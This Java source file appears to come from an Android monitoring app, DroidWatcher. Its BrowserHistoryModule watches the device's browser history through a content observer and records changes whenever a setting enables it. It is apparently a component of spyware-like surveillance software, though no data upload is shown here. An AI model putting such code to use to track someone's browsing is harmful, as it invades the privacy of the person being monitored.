package com.droidwatcher.modules;

import com.droidwatcher.DBManager;
import com.droidwatcher.Debug;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.services.AppService;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.database.ContentObserver;
import android.preference.PreferenceManager;
import android.provider.Browser;

public class BrowserHistoryModule implements OnSharedPreferenceChangeListener {
	private Context mContext;
	private SettingsManager mSettings;
	private ContentObserver mObserver;
	
	public BrowserHistoryModule(Context context){
		this.mContext = context;
		this.mSettings = new SettingsManager(context);
		
		this.mObserver = new ContentObserver(null) {
			@Override
			public void onChange(boolean selfChange) {
				super.onChange(selfChange);
				
				if (AppService.sThreadManager != null) {
		        	AppService.sThreadManager.onBrowserHistoryChange();
				}
			}
		};
		
		PreferenceManager.getDefaultSharedPreferences(context).registerOnSharedPreferenceChangeListener(this);
	}
	
	public void start(){
		if (mSettings.isBrowserHistoryEnabled()) {
			registerObserver();
		}
	}
	
	private void registerObserver(){
		mContext.getContentResolver().registerContentObserver(Browser.BOOKMARKS_URI, true, mObserver);
	}
	
	private void unregisterObserver(){
		try {
			mContext.getContentResolver().unregisterContentObserver(mObserver);
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	public void dispose(){
		unregisterObserver();

		mContext = null;
		mSettings = null;
		mObserver = null;
	}

	@Override
	public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
		try {
			if (key.equals(SettingsManager.KEY_BROWSER_HISTORY)) {
				if (mSettings.isBrowserHistoryEnabled()) {
					if (AppService.sThreadManager != null) {
			        	AppService.sThreadManager.resetBrowserHistory();
					}
					else{
						new DBManager(mContext).resetBrowserHistory();
					}
					
					registerObserver();
				}
				else{
					unregisterObserver();
				}
			}
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}

}
